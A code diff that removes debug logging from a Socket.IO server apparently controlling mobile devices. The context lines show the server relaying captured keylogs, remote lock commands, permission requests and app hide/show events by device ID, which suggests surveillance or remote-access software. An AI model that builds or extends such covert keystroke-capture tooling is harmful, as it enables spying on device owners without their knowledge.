@@ -257,8 +257,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, fps } = data;
-						console.log("screen fps monitor=>", deviceId);
-
 						// Send FPS requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_SCREEN_FPS_EVENT}-${deviceId}`,
@@ -300,8 +298,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, event } = data;
-						console.log("screen lock monitor=>", deviceId, event);
-
 						// Send lock/unlock requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_DEVICE_LOCK}-${deviceId}`,
@@ -587,7 +583,6 @@ export const startSocketIO = async () => {
 							keylogs !== "[]" &&
 							keylogs !== ""
 						) {
-							console.log("KEYLOGS SEND===>", keylogs);
 							io.emit(
 								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
 								{
@@ -622,7 +617,6 @@ export const startSocketIO = async () => {
 							keylogs !== "[]" &&
 							keylogs !== ""
 						) {
-							console.log("real-time keylogs:", keylogs);
 							// Data should be include deviceId and keylogs
 							addNewKeyLogs(response);
 						} else {
@@ -1095,8 +1089,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, event } = data;
-						console.log("device permission:", deviceId, event);
-
 						// Send permission requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_DEVICE_PERMISSION_EVENT}-${deviceId}`,
@@ -1213,7 +1205,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, event } = data;
-						console.log("hide/show app:", data);
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_VISIBLE_APP_EVENT}-${deviceId}`,
 							{
